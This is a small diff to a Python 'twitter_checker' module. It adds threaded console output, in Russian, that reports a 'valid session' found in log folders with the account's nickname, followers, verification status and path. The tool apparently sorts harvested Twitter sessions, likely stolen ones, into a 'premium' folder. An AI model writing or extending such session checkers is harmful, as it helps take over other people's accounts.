@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 import shutil
+import threading
 
 import StandartMethod
 import re
@@ -78,6 +79,11 @@ class twitter_checker():
 				json.dump(data, outfile, indent=4, ensure_ascii=False)
 			shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{valid_path}')
 
+		print(f"\n[{threading.current_thread().name}] Twitter Обнаружена валидная сессия\n"
+			  f"[{threading.current_thread().name}] Ник: {nick}\n"
+			  f"[{threading.current_thread().name}] Фолловеров: {followers_count}\n"
+			  f"[{threading.current_thread().name}] Верификация: {verified}\n"
+			  f"[{threading.current_thread().name}] Путь: {dir_path}")
 	@staticmethod
 	def checker(dict, account, path_log, file):
 		headers = StandartMethod.StandartMetod.get_headers()
